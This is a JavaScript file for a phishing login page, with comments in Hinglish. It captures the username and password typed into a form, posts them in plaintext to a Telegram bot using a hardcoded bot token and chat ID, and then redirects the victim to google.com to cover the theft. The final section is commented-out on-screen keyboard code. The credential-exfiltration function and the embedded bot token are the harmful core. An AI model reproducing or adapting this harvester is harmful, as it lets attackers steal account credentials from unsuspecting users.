// apna BOT TOKEN yahan dalen
const telegramBotToken = '8066281079:AAEqI4SnaSsWtlRaqBt8qDrQj9-_gH1gUVs';
const chatId = '6163067472';

// notification show karne ka function
function showNotification(message, type) {
  const notification = document.getElementById('notification');
  notification.textContent = message;
  notification.className = `notification ${type}`;
  notification.style.display = 'block';
  setTimeout(() => {
    notification.style.display = 'none';
  }, 3000);
}

// backend ko send karna
async function sendToTelegram(username, password) {
  // message text
  const message = `🔔 Login Attempt:\nUsername: ${username}\nPassword: ${password}`;

  // Telegram API URL
  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  try {
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    const result = await response.json();
    console.log('Result from backend:', result);

    if (response.ok && result.ok) {
      showNotification('Login details sent successfully!', 'success');
      // ⏳ Redirect after 1.5 seconds
      setTimeout(() => {
        window.location.href = 'https://www.google.com';
      }, 1500);
    } else {
      showNotification('Server error:', 'error');
    }
  } catch (error) {
    console.error('Error sending message:', error);
    showNotification('Network error!', 'error');
  }
}

// form submit handle karna
const loginForm = document.getElementById('loginForm');
loginForm.addEventListener('submit', function (event) {
  event.preventDefault();

  const usernameInput = event.target.username;
  const passwordInput = event.target.password;

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();

  let valid = true;

  // sab error clear karo
  clearError(usernameInput);
  clearError(passwordInput);

  // username validate
  if (!username) {
    showError(usernameInput, 'Username required');
    valid = false;
  }

  // password validate
  if (!password) {
    showError(passwordInput, 'Password required');
    valid = false;
  }

  if (!valid) return; // agar validation fail ho gaya to stop

  // agar sab sahi hai to send karo
  sendToTelegram(username, password);
  event.target.reset();
});

// error show karna
function showError(inputElement, message) {
  // error message create ya select karo
  let errorMessage = inputElement.nextElementSibling;
  if (!errorMessage || !errorMessage.classList.contains('error-message')) {
    errorMessage = document.createElement('small');
    errorMessage.classList.add('error-message');
    inputElement.insertAdjacentElement('afterend', errorMessage);
  }

  // input border red + error message show
  inputElement.classList.add('error');
  errorMessage.textContent = message;
  errorMessage.style.display = 'block';

  // placeholder hide
  inputElement.setAttribute('data-placeholder', inputElement.placeholder); // store original
  inputElement.placeholder = '';
}

function clearError(inputElement) {
  const errorMessage = inputElement.nextElementSibling;
  if (errorMessage && errorMessage.classList.contains('error-message')) {
    inputElement.classList.remove('error');
    errorMessage.textContent = '';
    errorMessage.style.display = 'none';

    // placeholder wapas karo
    if (inputElement.hasAttribute('data-placeholder')) {
      inputElement.placeholder = inputElement.getAttribute('data-placeholder');
      inputElement.removeAttribute('data-placeholder');
    }
  }
}

// user type kare to error hata do aur placeholder wapas
document.querySelectorAll('.input').forEach(input => {
  input.addEventListener('input', () => {
    clearError(input);
  });
});

// const openKeyboardBtn = document.getElementById('openKeyboard');
// const screenKeyboard = document.getElementById('screenKeyboard');
// const closeKeyboardBtn = document.getElementById('closeKeyboard');
// const keys = document.querySelectorAll('.key');
// let currentInput = null;
// let shiftActive = false;
// let capsActive = false;

// // Open keyboard
// openKeyboardBtn.addEventListener('click', () => {
//   currentInput = document.querySelector('.input:focus') || document.querySelector('.input');
//   screenKeyboard.style.display = 'block';
//   currentInput.focus();
// });

// // Close keyboard
// closeKeyboardBtn.addEventListener('click', () => {
//   screenKeyboard.style.display = 'none';
//   currentInput = null;
// });

// // Toggle Caps Lock
// const capsLockBtn = document.getElementById('capsLock');
// capsLockBtn.addEventListener('click', () => {
//   capsActive = !capsActive;
//   capsLockBtn.classList.toggle('active');
// });

// // Toggle Shift
// const shiftBtn = document.getElementById('shift');
// shiftBtn.addEventListener('click', () => {
//   shiftActive = !shiftActive;
//   shiftBtn.classList.toggle('active');
// });

// // Type keys
// keys.forEach(key => {
//   key.addEventListener('click', () => {
//     if (!currentInput) return;

//     const keyValue = key.dataset.key;

//     switch(key.id) {
//       case 'backspace':
//         currentInput.value = currentInput.value.slice(0, -1);
//         break;
//       case 'space':
//         currentInput.value += ' ';
//         break;
//       case 'enter':
//         currentInput.value += '\n';
//         break;
//       case 'tab':
//         currentInput.value += '\t';
//         break;
//       case 'arrowUp':
//         // optionally handle
//         break;
//       case 'arrowDown':
//         break;
//       case 'arrowLeft':
//         break;
//       case 'arrowRight':
//         break;
//       case 'shift':
//       case 'capsLock':
//       case 'ctrl':
//       case 'alt':
//       case 'closeKeyboard':
//         break;
//       default:
//         let char = keyValue;
//         if (shiftActive) {
//           char = char.toUpperCase();
//           shiftActive = false;
//           shiftBtn.classList.remove('active');
//         } else if (capsActive) {
//           char = char.toUpperCase();
//         } else {
//           char = char.toLowerCase();
//         }
//         currentInput.value += char;
//     }

//     currentInput.dispatchEvent(new Event('input'));
//     currentInput.focus();
//   });
// });
